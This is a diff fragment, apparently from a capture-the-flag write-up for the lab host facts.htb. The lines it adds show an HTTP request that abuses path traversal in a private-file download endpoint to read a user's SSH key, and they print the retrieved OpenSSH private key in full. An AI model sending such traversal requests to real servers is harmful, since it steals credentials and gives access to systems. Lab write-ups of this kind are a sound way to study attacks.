@@ -319,7 +319,23 @@ then http://facts.htb/admin/media/download_private_file?file=../../../../../../e
 }
 ```
 
+```
+GET /admin/media/download_private_file?file=../../../../../../home/trivia/.ssh/id_ed25519 HTTP/1.1
+Host: facts.htb
 
+found id_rsa
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDDQGaeC4
+TryXp035r4usTuAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIC4H/Rkhchr/qaF+
+zGIP81HLNvZZGU+gVyBMZY3QSSlZAAAAoFqgOg5lNgaqrXAykL7A4ODUrrg613Q3gPuWXN
+6fv786HlikqVz5jsysOeas1XSRmC4l+4APHZvIvavOzsSg4xR1RvV+nWMCUF07A2I+FCuz
+CuElUCi1hVBnYKQU6qrnYwHa2G5h4FvYKdQrOJzDfc3+0ICCwOkPPsVDP9XgFmSGTVys1r
+g4A1fVyrzdBmDIRtEdud2JwdrqWK3mBlvqZYw=
+-----END OPENSSH PRIVATE KEY-----
+
+
+```
 
 
 
